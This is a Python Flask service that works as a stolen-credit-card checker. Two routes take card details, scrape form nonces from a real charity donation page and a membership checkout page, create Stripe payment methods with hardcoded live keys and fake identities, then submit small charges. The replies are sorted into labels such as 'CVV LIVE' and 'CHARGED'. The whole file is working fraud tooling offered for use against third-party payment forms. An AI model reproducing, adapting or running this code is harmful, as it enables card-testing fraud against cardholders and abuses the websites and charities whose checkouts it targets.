from flask import Flask, request, jsonify
import requests
import re
import random
from faker import Faker
import string
import uuid
import os
import time

app = Flask(__name__)

STRIPE_API_URL = 'https://api.stripe.com/v1/payment_methods'
WEBSITE_API_URL = 'https://www.beitsahourusa.org/wp-admin/admin-ajax.php'
REFERER_WEBSITE = 'https://www.beitsahourusa.org/campaigns/support-the-national-foundation/'

def get_str(s, start, end):
    res = re.search(re.escape(start) + r'(.*?)' + re.escape(end), s)
    return res.group(1) if res else ''

@app.route('/skbased', methods=['GET'])
def skbased():
    # Получаем и валидируем входные данные
    cc_param = request.args.get('cc', '')
    if not cc_param:
        return "Error: CC details not provided.", 400

    parts = cc_param.strip().split('|')
    if len(parts) < 4:
        return "Error: Incomplete CC details provided.", 400

    cc, mes, ano, cvv = parts[:4]

    # --- 1. Получаем nonce с сайта ---
    cookies = {
        '_fbp': 'fb.1.1737792976616.327548265995879052',
        '__stripe_mid': '15d9a099-1551-428d-b375-2a5276f063cafd5f3c',
        'charitable_session': 'f1a2d46a8f5e4449419775b70d902d46||86400||82800',
        '__stripe_sid': '98ed2f0d-29fc-454f-b236-42a1786c7892629a35',
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2025-03-10%2012%3A40%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.beitsahourusa.org%2Fcampaigns%2Fsupport-the-national-foundation%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.beitsahourusa.org%2Fcampaign_category%2Fnational%2F',
        'sbjs_first_add': 'fd%3D2025-03-10%2012%3A40%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.beitsahourusa.org%2Fcampaigns%2Fsupport-the-national-foundation%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.beitsahourusa.org%2Fcampaign_category%2Fnational%2F',
        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36',
        'sbjs_session': 'pgs%3D13%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.beitsahourusa.org%2Fcampaign_category%2Fnational%2F',
    }
    headers = {
        'authority': 'www.beitsahourusa.org',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': 'https://www.beitsahourusa.org/campaign_category/national/',
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
    }
    try:
        r = requests.get(REFERER_WEBSITE, headers=headers, cookies=cookies, timeout=15)
        if r.status_code != 200:
            return f"Nonce page error: {r.status_code}", 502
        nonce = get_str(r.text, 'name="_charitable_donation_nonce" value="', '"')
        if not nonce:
            return "Nonce value not found.", 400
    except Exception as ex:
        return f"Error getting nonce: {str(ex)}", 500

    # --- 2. Stripe API ---
    stripe_headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'pragma': 'no-cache',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }
    stripe_data = {
        'type': 'card',
        'billing_details[name]': 'Rolexx Leo',
        'billing_details[email]': 'youf3321@gmail.com',
        'billing_details[address][postal_code]': '10080',
        'card[number]': cc,
        'card[cvc]': cvv,
        'card[exp_month]': mes,
        'card[exp_year]': ano,
        'guid': '775e2fb6-2777-43af-99e7-4fba2042baf326fd59',
        'muid': '15d9a099-1551-428d-b375-2a5276f063cafd5f3c',
        'sid': '6eb26545-e2d6-41bc-8580-b27f1093c9327db465',
        'payment_user_agent': 'stripe.js/2ddc5912fa; stripe-js-v3/2ddc5912fa; card-element',
        'referrer': 'https://www.beitsahourusa.org',
        'time_on_page': '43645',
        'key': 'pk_live_51HhefWFVQkom3lAfFiSCo1daFNqT2CegRXN4QedqlScZqZRP55JVTekqb4d68wMYUY4bfg8M9eJK8A3pou9EKdhW00QAVLLIdm',
        'radar_options[hcaptcha_token]': 'P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9....', # Используй свой актуальный токен!
    }
    try:
        r = requests.post(STRIPE_API_URL, data=stripe_data, headers=stripe_headers, timeout=15)
        stripe_response = r.json()
        if r.status_code != 200 or 'id' not in stripe_response:
            return f"Error: Stripe API request failed. Status code: {r.status_code} - Response: {stripe_response}", 400
        stripe_payment_method_id = stripe_response['id']
    except Exception as ex:
        return f"cURL Error (Stripe): {str(ex)}", 500

    # --- 3. Финальный запрос на сайт ---
    website_headers = {
        'authority': 'www.beitsahourusa.org',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.beitsahourusa.org',
        'pragma': 'no-cache',
        'referer': REFERER_WEBSITE,
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    website_data = {
        'charitable_form_id': '6795cbf97e1d9',
        '6795cbf97e1d9': '',
        '_charitable_donation_nonce': nonce,
        '_wp_http_referer': '/campaigns/support-the-national-foundation/',
        'campaign_id': '199',
        'description': 'Support The National Foundation',
        'ID': '0',
        'custom_donation_amount': '1.00',
        'recurring_donation': 'once',
        'first_name': 'Rolexx',
        'last_name': 'Rolexx',
        'email': 'youf3321@gmail.com',
        'additiona_message': 'xRonak GOD',
        'gateway': 'stripe',
        'stripe_payment_method': stripe_payment_method_id,
        'cover_fees': '1',
        'action': 'make_donation',
        'form_action': 'make_donation',
    }
    try:
        r = requests.post(WEBSITE_API_URL, data=website_data, headers=website_headers, timeout=15)
        website_response = r.json()
    except Exception as ex:
        return f"cURL Error : error", 500

    # --- 4. Ответ пользователю ---
    if website_response.get("requires_action") is True:
        return "CHARGE 1$ 🔥"
    elif r.status_code == 200:
        if website_response.get("errors"):
            errors = website_response["errors"]
            return " ".join(errors)
        elif website_response.get("success") is True:
            return "CHARGE 1$ 🔥"
        else:
            return "SK DEAD ⚠️"
    else:
        return "SK EXPIRE 👾"
        
#Stripe 19$

# Configuration
WARNISX_SITE = "https://smartbird.ai/membership-account/membership-checkout/"
AMT = "19$"

STATE_ABBR = {
    "alabama": "AL", "alaska": "AK", "arizona": "AR", "california": "CA", "colorado": "CO",
    "connecticut": "CT", "delaware": "DE", "district of columbia": "DC", "florida": "FL",
    "georgia": "GA", "hawaii": "HI", "idaho": "ID", "illinois": "IL", "indiana": "IN",
    "iowa": "IA", "kansas": "KS", "kentucky": "KY", "louisiana": "LA", "maine": "ME",
    "maryland": "MD", "massachusetts": "MA", "michigan": "MI", "minnesota": "MN",
    "mississippi": "MS", "missouri": "MO", "montana": "MT", "nebraska": "NE", "nevada": "NV",
    "new hampshire": "NH", "new jersey": "NJ", "new mexico": "NM", "new york": "NY",
    "north carolina": "NC", "north dakota": "ND", "ohio": "OH", "oklahoma": "OK", "oregon": "OR",
    "pennsylvania": "PA", "rhode island": "RI", "south carolina": "SC", "south dakota": "SD",
    "tennessee": "TN", "texas": "TX", "utah": "UT", "vermont": "VT", "virginia": "VA",
    "washington": "WA", "west virginia": "WV", "wisconsin": "WI", "wyoming": "WY"
}

fake = Faker('en_US')

def get_str(string, start, end):
    try:
        return string.split(start,1)[1].split(end,1)[0]
    except IndexError:
        return ""

def abbreviate_state(state):
    return STATE_ABBR.get(state.lower(), "KY")

def get_random_user():
    # 1. Try RandomUser API
    try:
        randuser_resp = requests.get('https://randomuser.me/api/?nat=us', timeout=5)
        if randuser_resp.status_code == 200:
            randuser_json = randuser_resp.json()
            randuser = randuser_json['results'][0]
            return {
                'first': randuser['name']['first'],
                'last': randuser['name']['last'],
                'phone': ''.join(filter(str.isdigit, randuser['phone']))[:10] or fake.msisdn()[:10],
                'postcode': str(randuser['location']['postcode']),
                'state': randuser['location']['state'],
                'city': randuser['location']['city'],
                'street': randuser['location']['street']['name'] if isinstance(randuser['location']['street'], dict) else randuser['location']['street'],
                'email': randuser['email'].replace("example.com", "gmail.com")
            }
    except Exception as e:
        print(f"[WARN] randomuser.me failed: {e}")

    # 2. Fallback: Generate with Faker
    print("[INFO] Using Faker fallback user data.")
    return {
        'first': fake.first_name(),
        'last': fake.last_name(),
        'phone': fake.msisdn()[:10],
        'postcode': fake.zipcode(),
        'state': fake.state(),
        'city': fake.city(),
        'street': fake.street_name(),
        'email': fake.email().replace("example.com", "gmail.com")
    }

@app.route('/xx', methods=['GET'])
def cvv_check():
    cc_line = request.args.get('cc', '')
    if not cc_line:
        return jsonify({'error': 'CC details not provided.'}), 400

    parts = cc_line.split('|')
    if len(parts) < 4:
        return jsonify({'error': 'Incomplete CC details provided.'}), 400

    cc, mes, ano, cvv = parts[0], parts[1], parts[2], parts[3]

    # Generate user info
    user = get_random_user()
    firstname = user['first']
    lastname = user['last']
    phone = user['phone']
    zip_code = user['postcode']
    state = abbreviate_state(user['state'])
    email = user['email']
    city = user['city']
    street = user['street']

    # 1. Get the nonce from the form
    try:
        r = requests.get(WARNISX_SITE)
        nonce = get_str(r.text, 'pmpro_checkout_nonce" value="', '"')
        if not nonce:
            return jsonify({'error': 'Nonce not found. Cannot proceed.'}), 500
    except Exception as e:
        return jsonify({'error': f'Failed to get nonce: {e}'}), 500

    # 2. Create Stripe payment method
    try:
        stripe_headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 11; Mobile) Chrome/127.0.0.0'
        }
        stripe_data = {
            'type': 'card',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mes,
            'card[exp_year]': ano,
            'guid': 'NA',
            'muid': 'random-muid',
            'sid': 'random-sid',
            'pasted_fields': 'number',
            'payment_user_agent': 'stripe.js',
            'referrer': 'https://smartbird.ai',
            'time_on_page': '1000',
            'key': 'pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX',
            '_stripe_account': 'acct_1JaLtlBFm85WBPMB'
        }
        r = requests.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data)
        payment_method_id = r.json().get('id')
        if not payment_method_id:
            return jsonify({'error': 'Stripe payment method creation failed.', 'stripe_response': r.text}), 500
    except Exception as e:
        return jsonify({'error': f'Stripe API failed: {e}'}), 500

    # 3. Submit to checkout page
    try:
        checkout_headers = {
            'authority': 'smartbird.ai',
            'accept': 'text/html,application/xhtml+xml,application/xml',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://smartbird.ai',
            'referer': WARNISX_SITE,
            'user-agent': 'Mozilla/5.0 (Linux; Android 11; Mobile) Chrome/127.0.0.0'
        }
        post_data = {
            'pmpro_level': '1',
            'checkjavascript': '1',
            'pmpro_other_discount_code': '',
            'username': f'{firstname}js4sdjd{mes}hd{nonce}646',
            'password': 'ronak223',
            'password2': 'ronak223',
            'bemail': email,
            'bconfirmemail': email,
            'fullname': '',
            'gateway': 'stripe',
            'submit-checkout': '1',
            'javascriptok': '1',
            'sfirstname': firstname,
            'slastname': lastname,
            'saddress1': street or 'Street 837',
            'saddress2': '',
            'scity': city or 'New York',
            'sstate': state,
            'szipcode': zip_code,
            'sphone': phone,
            'scountry': 'US',
            'CardType': 'mastercard',
            'pmpro_discount_code': '',
            'pmpro_checkout_nonce': nonce,
            '_wp_http_referer': '/membership-account/membership-checkout/',
            'payment_method_id': payment_method_id,
            'AccountNumber': 'XXXXXXXXXXXX0341',
            'ExpirationMonth': mes,
            'ExpirationYear': ano
        }
        r = requests.post(WARNISX_SITE, headers=checkout_headers, data=post_data)
        result2 = r.text
    except Exception as e:
        return jsonify({'error': f'Checkout request failed'}), 500

    # 4. Parse and return result
    if "payment_intent_unexpected_state" in result2:
        return "Payment Intent Confirmed  ⚠️"
    elif "succeeded" in result2:
        return f"CHARGED {AMT} ✅"
    elif "Your card has insufficient funds." in result2:
        return "INSUFFICIENT FUNDS ✅"
    elif "incorrect_zip" in result2:
        return "CVV LIVE ✅"
    elif "incorrect_cvc" in result2:
        return "CCN LIVE ✅"
    elif any(x in result2 for x in ("security code is incorrect.", "security code is invalid.", "Security code is incorrect")):
        return "CCN LIVE ✅"
    elif "transaction_not_allowed" in result2:
        return "CVV LIVE ✅"
    elif "stripe_3ds2_fingerprint" in result2:
        return "3D ✅"
    elif "generic_decline" in result2:
        return "GENERIC DECLINE ❌"
    elif "do_not_honor" in result2:
        return "DO NOT HONOR ❌"
    elif "fraudulent" in result2:
        return "FRAUDULENT ❌"
    elif "Nonce security check failed." in result2:
        return "Proxy ded ⚠️"
    elif "incorrect_number" in result2:
        return "incorrect_number ❌"
    elif "expired_card" in result2 or "invalid_expiry_month" in result2 or "exp_month" in result2:
        return "expired_card ❌"
    elif "invalid_cvc" in result2:
        return "Your card security code is invalid.❌"
    elif "stolen_card" in result2:
        return "stolen_card ❌"
    elif "intent_confirmation_challenge" in result2:
        return "Captcha ⚠️"
    elif 'Your card was declined.' in result2 or 'Error updating default payment method. Your card was declined.' in result2:
        return "Your card was declined. ❌"
    elif '"cvc_check": "pass"' in result2:
        return "CVV LIVE ✅"
    elif "Membership Confirmation" in result2:
        return f"Thank You For Donation. {AMT} ✅"
    elif any(x in result2 for x in ["Thank you for your support!", "Thankyou for your donation", "Thank You For Donation.", "Thank You"]):
        return f"CHARGED {AMT} ✅"
    elif "/wishlist-member/?reg=" in result2:
        return f"Thank You For Donation. {AMT} ✅"
    elif "Card is declined by your bank, please contact them for additional information." in result2:
        return "CVV LIVE ✅"
    elif "Your card does not support this type of purchase." in result2:
        return "CVV LIVE ✅"
    elif "Your card number is incorrect." in result2:
        return "Your card number is incorrect."
    elif "Your card is expired." in result2:
        return "Your card is expired."
    elif "Your card is not supported." in result2:
        return "CARD NOT SUPPORTED"
    else:
        return f"404 Payment declined\n\nResponse:\n{result2}"    
 
@app.route('/')
def status():
    start = time.time()
    # Можно добавить проверки, например, работоспособность зависимостей
    # Например, попробовать получить nonce или просто вернуть "OK"
    status_message = "Script is running ✅"
    elapsed_ms = int((time.time() - start) * 1000)
    html = f"""
    <html>
        <head><title>Status</title></head>
        <body style="font-family:monospace; background:#181818; color:#eee;">
            <h2>Status page</h2>
            <p>{status_message}</p>
            <p>Uptime: {elapsed_ms} ms</p>
            <p>Try <code>/cvv?cc=xxxx|mm|yy|cvv</code> for CVV check API.</p>
        </body>
    </html>
    """
    return html
    
                                  
#Complete

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)